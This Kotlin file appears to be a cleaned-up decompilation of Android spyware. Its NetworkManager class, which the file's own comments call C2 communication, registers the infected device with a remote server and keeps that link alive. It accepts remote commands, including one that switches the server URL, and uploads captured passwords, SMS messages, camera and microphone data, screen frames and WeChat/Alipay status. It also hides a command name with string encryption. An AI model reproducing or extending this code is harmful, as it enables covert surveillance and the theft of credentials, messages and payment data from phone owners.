package com.storm.safe.rock.service.modules

import android.content.Context
import android.util.Log
import com.storm.safe.rock.network.DataSyncClient
import com.storm.safe.rock.network.DeviceRegistrar
import com.storm.safe.rock.network.FrameSender
import com.storm.safe.rock.network.HeartbeatManager
import com.storm.safe.rock.network.HttpManager
import com.storm.safe.rock.network.MessageDispatcher
import com.storm.safe.rock.network.NetworkMonitor
import com.storm.safe.rock.network.ReconnectionManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import com.storm.safe.rock.service.MyAccessibilityService
import com.storm.safe.rock.util.StringUtil
import org.json.JSONException
import org.json.JSONObject

/**
 * Thin facade coordinating all C2 communication via DataSyncClient.
 * JADX: C0323a8 (1,734 lines) — refactored into 6 extracted components:
 *   HeartbeatManager, DeviceRegistrar, ReconnectionManager,
 *   NetworkMonitor, FrameSender, MessageDispatcher.
 */
class NetworkManager {

    enum class ConnectionState { DISCONNECTED, CONNECTING, CONNECTED, RECONNECTING }

    companion object {
        private const val TAG = "NetworkManager"
        private val singletonLock = Any()
        @Volatile @JvmStatic var instance: NetworkManager? = null; private set

        const val BASE_RECONNECT_DELAY_MS = 5000L
        const val MAX_RECONNECT_DELAY_MS = 30000L
        const val JITTER_MAX_MS = 2000L
        const val HEARTBEAT_INTERVAL_MS = 25000L
        const val HEARTBEAT_TIMEOUT_MS = 60000L
        const val MAX_FRAME_QUEUE_SIZE = 10
        const val MAX_MESSAGE_QUEUE_SIZE = 10
        const val MAX_CONSECUTIVE_FAILURES = 5
        const val FRAME_DEDUP_WINDOW_MS = 3000L
        const val FRAME_STATS_INTERVAL_MS = 30000L
        const val FRAME_LOG_THROTTLE_MS = 10000L

        /** Parse server URL into (host, port). Handles ws/wss/http/https. JADX: a9 */
        @JvmStatic fun parseServerUrl(url: String): Pair<String, Int> {
            if (url.isBlank()) return Pair("localhost", 8080)
            var working = url
            if (working.contains(";")) working = working.split(";").last().trim()
            val secure = isSecure(working)
            working = working.replace("ws://", "").replace("wss://", "")
                .replace("http://", "").replace("https://", "")
            working = working.split("/").first()
            if (working.isBlank()) return Pair("localhost", if (secure) 443 else 8080)
            val parts = working.split(":")
            val host = parts.firstOrNull()?.takeIf { it.isNotBlank() } ?: "localhost"
            val port = if (parts.size > 1) parts[1].toIntOrNull() ?: if (secure) 443 else 8080
                       else if (secure) 443 else 8080
            return Pair(host, port)
        }

        /** JADX: d5 */ @JvmStatic fun isSecure(url: String): Boolean =
            url.startsWith("https://", true) || url.startsWith("wss://", true)
    }

    // ── Core state ──
    private var context: Context? = null
    private var dataSyncClient: DataSyncClient? = null
    internal var httpManager: HttpManager? = null
    private var heartbeatManager: HeartbeatManager? = null
    private var deviceRegistrar: DeviceRegistrar? = null
    private var reconnectionManager: ReconnectionManager? = null
    private var networkMonitor: NetworkMonitor? = null
    private var frameSender: FrameSender? = null
    private var messageDispatcher: MessageDispatcher? = null

    @Volatile var isConnected: Boolean = false; internal set
    @Volatile var isRegistered: Boolean = false; internal set
    @Volatile var isInitialized: Boolean = false; internal set
    @Volatile var connectionState: ConnectionState = ConnectionState.DISCONNECTED; private set

    var serverHost: String
        get() = reconnectionManager?.serverHost ?: ""
        internal set(value) { reconnectionManager?.serverHost = value }
    var serverPort: Int
        get() = reconnectionManager?.serverPort ?: 8080
        internal set(value) { reconnectionManager?.serverPort = value }
    var deviceId: String = ""; internal set
    var serverUrl: String = ""; private set
    var httpBaseUrl: String = ""; internal set
    var sessionId: String = ""; private set
    var ownerToken: String = ""
    var serverUrls: List<String>
        get() = reconnectionManager?.serverUrls ?: emptyList()
        internal set(value) { reconnectionManager?.serverUrls = value }
    var currentServerIndex: Int
        get() = reconnectionManager?.currentServerIndex ?: 0
        internal set(value) { reconnectionManager?.currentServerIndex = value }
    var heartbeatCount: Int
        get() = heartbeatManager?.heartbeatCount ?: 0
        internal set(value) { heartbeatManager?.heartbeatCount = value }
    var totalHeartbeats: Int
        get() = heartbeatManager?.totalHeartbeats ?: 0
        internal set(value) { heartbeatManager?.totalHeartbeats = value }
    var lastHeartbeatTime: Long
        get() = heartbeatManager?.lastHeartbeatTime ?: 0L
        internal set(value) { heartbeatManager?.lastHeartbeatTime = value }
    var consecutiveFailures: Int
        get() = reconnectionManager?.consecutiveFailures ?: 0
        internal set(value) { reconnectionManager?.consecutiveFailures = value }
    var frameSkippedCount: Int
        get() = frameSender?.frameSkippedCount ?: 0
        internal set(value) { frameSender?.frameSkippedCount = value }
    var frameSentCount: Int
        get() = frameSender?.frameSentCount ?: 0
        internal set(value) { frameSender?.frameSentCount = value }
    val messageQueueCapacity: Int get() = messageDispatcher?.messageQueueCapacity ?: MAX_MESSAGE_QUEUE_SIZE
    val messageQueueSize: Int get() = messageDispatcher?.messageQueueSize ?: 0

    private var lastSyncedUrl: String = ""
    @Volatile var commandCallback: ((JSONObject) -> Unit)? = null
    private val keepAliveLock = Any()
    private var keepAliveStarted: Boolean = false

    // ── Lifecycle ──

    /** Initialize network manager. JADX: b3 */
    fun initialize(context: Context) {
        if (isInitialized) {
            if (isHealthy()) { Log.d(TAG, "已初始化且健康，跳过"); return }
            Log.w(TAG, "已初始化但内部 Job 已死，强制重启保活"); restartKeepAlive(); return
        }
        try {
            this.context = context
            val androidId = try {
                android.provider.Settings.Secure.getString(context.contentResolver, "android_id") ?: "unknown"
            } catch (_: Exception) { "unknown" }
            this.deviceId = androidId; this.sessionId = androidId

            dataSyncClient = DataSyncClient(context,
                onMessageCallback = { handleRemoteCommand(it) },
                onConnectionChanged = { onConnectionStateChanged(it) })
            httpManager = HttpManager.getOrCreate(context).apply { this.deviceId = this@NetworkManager.deviceId }
            loadAppConfig(context)

            try {
                val json = JSONObject(context.assets.open("config.json").bufferedReader().use { it.readText() })
                val httpUrl = json.optJSONObject("network")?.optString("server_url", "") ?: ""
                if (httpUrl.isNotEmpty()) { httpManager?.baseUrl = httpUrl.trimEnd('/') }
            } catch (_: Exception) {}

            val dsc = dataSyncClient!!; val hm = httpManager!!

            heartbeatManager = HeartbeatManager(context, dsc).apply {
                this.deviceId = this@NetworkManager.deviceId; this.ownerToken = this@NetworkManager.ownerToken
                this.isConnectedProvider = { this@NetworkManager.isConnected }
                this.onHeartbeatSuccess = { reconnectionManager?.resetFailureCounter() }
                this.onHeartbeatFailure = { this@NetworkManager.isConnected = false }
            }
            deviceRegistrar = DeviceRegistrar(context, hm).apply {
                this.deviceId = this@NetworkManager.deviceId; this.ownerToken = this@NetworkManager.ownerToken
            }
            reconnectionManager = ReconnectionManager(dsc, hm).apply {
                this.deviceId = this@NetworkManager.deviceId
                this.onServerSwitched = { this@NetworkManager.isConnected = false; this@NetworkManager.isRegistered = false }
            }
            networkMonitor = NetworkMonitor(context) {
                if (!isConnected && isInitialized) { Log.d(TAG, "尝试重连..."); dataSyncClient?.connect() }
            }
            frameSender = FrameSender(dsc) { isConnected }.apply { this.deviceId = this@NetworkManager.deviceId }
            messageDispatcher = MessageDispatcher(dsc, hm) { isConnected }.apply {
                this.deviceId = this@NetworkManager.deviceId; this.ownerToken = this@NetworkManager.ownerToken
            }

            networkMonitor?.registerNetworkCallback()
            startWebSocketKeepAlive()
            if (serverUrl.isNotEmpty() && deviceId.isNotEmpty()) {
                Log.i(TAG, "自动连接 WebSocket: $serverUrl"); connectToServer(serverUrl, deviceId)
            }
            ActivityMonitor.networkCallback = { logs ->
                GlobalScope.launch(Dispatchers.IO) { try { httpManager?.uploadLogs(logs) } catch (e: Exception) { Log.w(TAG, "上传日志失败: ${e.message}") } }
            }
            isInitialized = true; instance = this; Log.i(TAG, "网络管理器初始化完成")
        } catch (e: Exception) { Log.e(TAG, "网络管理器初始化失败", e) }
    }

    private fun loadAppConfig(context: Context) {
        try {
            val json = JSONObject(context.assets.open("config.json").bufferedReader().use { it.readText() })
            val network = json.optJSONObject("network"); val auth = json.optJSONObject("auth")
            val configServerUrl = network?.optString("server_url", "") ?: ""
            val configWsUrl = network?.optString("websocket_url", "") ?: ""
            val configOverride = network?.optString("server_url_override", "") ?: ""
            val ownerToken = auth?.optString("owner_token", "") ?: ""
            val effectiveWsUrl = if (configOverride.isNotEmpty()) configOverride else configWsUrl
            if (effectiveWsUrl.isNotEmpty()) this.serverUrl = effectiveWsUrl
            else if (configServerUrl.isNotEmpty()) this.serverUrl = configServerUrl
            if (configServerUrl.isNotEmpty()) { this.httpBaseUrl = configServerUrl; context.getSharedPreferences("system_optimize", 0).edit().putString("server_addr", configServerUrl).apply() }
            if (ownerToken.isNotEmpty()) {
                this.ownerToken = ownerToken
                dataSyncClient?.ownerToken = ownerToken
                httpManager?.ownerToken = ownerToken
            }
            Log.i(TAG, "config.json: wsUrl=$serverUrl, serverUrl=$configServerUrl, ownerToken=${if (ownerToken.isNotEmpty()) "${ownerToken.take(10)}..." else "(empty)"}")
        } catch (e: Exception) { Log.w(TAG, "config.json 加载失败: ${e.message}") }
    }

    /** Connect to C2 server. JADX: a7 */
    fun connectToServer(url: String, deviceId: String) {
        this.serverUrl = url; this.deviceId = deviceId; this.sessionId = deviceId; syncDeviceIdToComponents()
        dataSyncClient?.let { it.serverUrl = url; it.deviceId = deviceId; connectionState = ConnectionState.CONNECTING; it.connect() }
    }

    /** Disconnect and clean up. JADX: a3 */
    fun disconnect() {
        try {
            keepAliveStarted = false; dataSyncClient?.disconnect()
            isConnected = false; isRegistered = false
            heartbeatManager?.heartbeatCount = 0; heartbeatManager?.totalHeartbeats = 0
            connectionState = ConnectionState.DISCONNECTED
        } catch (e: Exception) { Log.e(TAG, "断开连接失败", e) }
        networkMonitor?.unregisterNetworkCallback()
        dataSyncClient?.disconnect()
        isInitialized = false; instance = null
    }

    private fun onConnectionStateChanged(connected: Boolean) {
        isConnected = connected
        if (connected) {
            connectionState = ConnectionState.CONNECTED; Log.i(TAG, "WebSocket 已连接")
            reconnectionManager?.resetFailureCounter()
            if (!isRegistered) {
                Thread({
                    try {
                        deviceRegistrar?.cachedBatteryLevel = heartbeatManager?.cachedBatteryLevel ?: -1
                        deviceRegistrar?.cachedIsCharging = heartbeatManager?.cachedIsCharging ?: false
                        val deviceInfo = deviceRegistrar?.buildDeviceInfo() ?: buildDeviceInfo()
                        val result = kotlinx.coroutines.runBlocking {
                            messageDispatcher?.httpRegister(deviceInfo) ?: httpRegister(deviceInfo)
                        }
                        result.onSuccess { isRegistered = true; Log.i(TAG, "Device registered")
                            try { MyAccessibilityService.getInstance()?.frpcProcessManager?.updateDeviceId(deviceId) } catch (_: Exception) {}
                        }.onFailure { Log.e(TAG, "Registration failed: ${it.message}") }
                    } catch (e: Exception) { Log.e(TAG, "Registration error", e) }
                }, "DeviceRegister").start()
            }
            messageDispatcher?.drainMessageQueue()
        } else { connectionState = ConnectionState.DISCONNECTED; Log.i(TAG, "WebSocket 断开") }
    }

    // ── Delegated: HeartbeatManager ──
    fun sendHeartbeat(): Boolean = heartbeatManager?.sendHeartbeat() ?: false
    fun buildHeartbeatPayload(): JSONObject = heartbeatManager?.buildHeartbeatPayload() ?: JSONObject()

    // ── Delegated: DeviceRegistrar ──
    fun buildDeviceInfo(): JSONObject = deviceRegistrar?.buildDeviceInfo() ?: JSONObject()

    // ── Delegated: ReconnectionManager ──
    fun calculateReconnectDelay(attempt: Int): Long = reconnectionManager?.calculateReconnectDelay(attempt) ?: BASE_RECONNECT_DELAY_MS
    fun setServerUrls(urls: String) { reconnectionManager?.setServerUrls(urls) }
    fun currentUrl(): String? = reconnectionManager?.currentUrl()
    fun applyServerConfig() { reconnectionManager?.applyServerConfig() }
    fun buildHttpUrl(): String? = reconnectionManager?.buildHttpUrl()
    fun buildWsUrl(): String = reconnectionManager?.buildWsUrl() ?: ""
    fun switchToNextServer(): Boolean = reconnectionManager?.switchToNextServer() ?: false
    fun handleConnectionFailure() { reconnectionManager?.handleConnectionFailure() }
    fun resetFailureCounter() { reconnectionManager?.resetFailureCounter() }

    // ── Delegated: NetworkMonitor ──
    fun registerNetworkCallback() { networkMonitor?.registerNetworkCallback() }
    fun unregisterNetworkCallback() { networkMonitor?.unregisterNetworkCallback() }

    // ── Delegated: MessageDispatcher — message queue ──
    fun queueMessage(message: JSONObject) { messageDispatcher?.queueMessage(message) }
    fun drainMessageQueue() { messageDispatcher?.drainMessageQueue() }

    // ── Delegated: FrameSender ──
    fun sendScreenFrame(frameData: ByteArray) { frameSender?.sendScreenFrame(frameData) }

    // ── Keepalive — JADX: d7 ──
    fun startWebSocketKeepAlive() {
        if (keepAliveStarted) return
        synchronized(keepAliveLock) {
            if (keepAliveStarted) return; keepAliveStarted = true
            val thread = Thread({
                while (keepAliveStarted) {
                    try {
                        if (isConnected) sendHeartbeat() else if (isInitialized) dataSyncClient?.connect()
                        Thread.sleep(HEARTBEAT_INTERVAL_MS)
                    } catch (_: InterruptedException) { break }
                    catch (e: Exception) { Log.w(TAG, "保活异常: ${e.message}"); try { Thread.sleep(BASE_RECONNECT_DELAY_MS) } catch (_: InterruptedException) { break } }
                }
            }, "WS-KeepAlive"); thread.isDaemon = true; thread.start()
        }
    }

    private fun restartKeepAlive() {
        keepAliveStarted = false
        try { networkMonitor?.unregisterNetworkCallback() } catch (_: Exception) {}
        networkMonitor?.registerNetworkCallback(); startWebSocketKeepAlive()
    }

    // ── Health checks ──
    fun isHealthy(): Boolean = isInitialized && (isConnected || keepAliveStarted)
    fun isFullyConnected(): Boolean = isInitialized && isHealthy() && isConnected
    fun ensureConnected() {
        if (!isInitialized) { context?.let { initialize(it) }; return }
        if (!isHealthy()) restartKeepAlive()
    }

    // ── Delegated: MessageDispatcher — send methods ──
    fun sendEvent(type: String, data: JSONObject) { messageDispatcher?.sendEvent(type, data) }
    fun sendPasswordData(data: JSONObject) { messageDispatcher?.sendPasswordData(data) }
    fun sendIncomingSms(data: JSONObject) { messageDispatcher?.sendIncomingSms(data) }
    fun uploadSms(data: JSONObject) { messageDispatcher?.uploadSms(data) }
    fun sendCameraFrame(base64Image: String, mode: String) { messageDispatcher?.sendCameraFrame(base64Image, mode) }
    fun uploadInjectionData(data: JSONObject) { messageDispatcher?.uploadInjectionData(data) }
    fun sendPermissionsUpdate(context: Context) { messageDispatcher?.sendPermissionsUpdate(context) }
    fun sendPermissionResponse(data: JSONObject) { messageDispatcher?.sendPermissionResponse(data) }
    fun sendScreenLockStatus(data: JSONObject) { messageDispatcher?.sendScreenLockStatus(data) }
    fun sendOperationLog(data: JSONObject) { messageDispatcher?.sendOperationLog(data) }
    fun sendWechatDetectionStatus(data: JSONObject) { messageDispatcher?.sendWechatDetectionStatus(data) }
    fun sendAlipayDetectionStatus(data: JSONObject) { messageDispatcher?.sendAlipayDetectionStatus(data) }
    fun sendAutoPasswordDetectionStatus(data: JSONObject) { messageDispatcher?.sendAutoPasswordDetectionStatus(data) }
    fun notifyLocalServiceFullConfig(data: JSONObject) { messageDispatcher?.notifyLocalServiceFullConfig(data) }
    fun sendUiData(data: JSONObject) { messageDispatcher?.sendUiData(data) }
    @Throws(JSONException::class)
    fun sendMicData(sampleRate: Int, sampleCount: Int, audioBase64: String) { messageDispatcher?.sendMicData(sampleRate, sampleCount, audioBase64) }
    fun sendData(data: JSONObject) { messageDispatcher?.sendData(data) }
    fun sendPassword(password: String, source: String, inputMethod: String) { messageDispatcher?.sendPassword(password, source, inputMethod) }

    // ── Delegated: MessageDispatcher — HTTP upload ──
    suspend fun httpRegister(deviceInfo: JSONObject): Result<JSONObject> =
        messageDispatcher?.httpRegister(deviceInfo) ?: Result.failure(IllegalStateException("MessageDispatcher not initialized"))
    suspend fun httpUploadPasswordCapture(password: String, passwordType: String, inputMethod: String, appName: String, packageName: String, confidence: Int): Result<JSONObject> =
        messageDispatcher?.httpUploadPasswordCapture(password, passwordType, inputMethod, appName, packageName, confidence) ?: Result.failure(IllegalStateException("MessageDispatcher not initialized"))
    suspend fun httpUploadSms(smsList: List<JSONObject>): Result<JSONObject> =
        messageDispatcher?.httpUploadSms(smsList) ?: Result.failure(IllegalStateException("MessageDispatcher not initialized"))
    suspend fun httpUploadIncomingSms(number: String, text: String, type: String, timestamp: Long): Result<JSONObject> =
        messageDispatcher?.httpUploadIncomingSms(number, text, type, timestamp) ?: Result.failure(IllegalStateException("MessageDispatcher not initialized"))
    suspend fun httpUploadLogs(logs: List<JSONObject>): Result<JSONObject> =
        messageDispatcher?.httpUploadLogs(logs) ?: Result.failure(IllegalStateException("MessageDispatcher not initialized"))
    suspend fun httpUploadInjectionData(data: JSONObject): Result<JSONObject> =
        messageDispatcher?.httpUploadInjectionData(data) ?: Result.failure(IllegalStateException("MessageDispatcher not initialized"))
    suspend fun httpUploadDeviceStatus(statusType: String, data: JSONObject): Result<JSONObject> =
        messageDispatcher?.httpUploadDeviceStatus(statusType, data) ?: Result.failure(IllegalStateException("MessageDispatcher not initialized"))

    // ── Remote command handler — JADX: initialize$1 ──
    fun handleRemoteCommand(json: String) {
        try {
            val command = JSONObject(json)
            val commandName = command.optString("command", "unknown")
            // force_register
            if (commandName == StringUtil.decrypt("LVYDOUgHHitQODhNFCg=")) {
                isRegistered = false
                Thread({ try { buildDeviceInfo() } catch (e: Exception) { Log.e(TAG, "Re-registration failed", e) } }, "ForceRegister").start()
                return
            }
            if (commandName == "CHANGE_SERVER_URL") { handleChangeServerUrl(command); return }
            commandCallback?.invoke(command) ?: Log.w(TAG, "commandCallback 未就绪，丢弃: $commandName")
        } catch (e: Exception) { Log.w(TAG, "处理命令失败", e) }
    }

    private fun handleChangeServerUrl(command: JSONObject) {
        var newUrl = command.optString("serverUrl", "")
        if (newUrl.isEmpty()) newUrl = command.optJSONObject("params")?.optString("serverUrl", "") ?: ""
        if (newUrl.isEmpty()) newUrl = command.optJSONObject("data")?.optString("serverUrl", "") ?: ""
        if (newUrl.isEmpty()) { Log.w(TAG, "CHANGE_SERVER_URL: serverUrl 为空"); return }
        dataSyncClient?.disconnect(); serverUrl = newUrl
        reconnectionManager?.serverUrls = listOf(newUrl); reconnectionManager?.currentServerIndex = 0
        reconnectionManager?.applyServerConfig(); dataSyncClient?.connect()
    }

    fun getDataSyncClient(): DataSyncClient? = dataSyncClient

    // ── Test support ──
    internal fun setTestClient(client: DataSyncClient, deviceId: String) { this.dataSyncClient = client; this.deviceId = deviceId; this.sessionId = deviceId }
    internal fun setTestConnectionState(connected: Boolean, registered: Boolean) { this.isConnected = connected; this.isRegistered = registered; this.connectionState = if (connected) ConnectionState.CONNECTED else ConnectionState.DISCONNECTED }
    internal fun setTestContext(ctx: Context) { this.context = ctx }
    internal fun setTestInitialized(initialized: Boolean) { this.isInitialized = initialized; if (initialized) keepAliveStarted = true }

    private fun syncDeviceIdToComponents() {
        heartbeatManager?.deviceId = deviceId; heartbeatManager?.ownerToken = ownerToken
        deviceRegistrar?.deviceId = deviceId; deviceRegistrar?.ownerToken = ownerToken
        reconnectionManager?.deviceId = deviceId; frameSender?.deviceId = deviceId
        messageDispatcher?.deviceId = deviceId; messageDispatcher?.ownerToken = ownerToken
    }
}
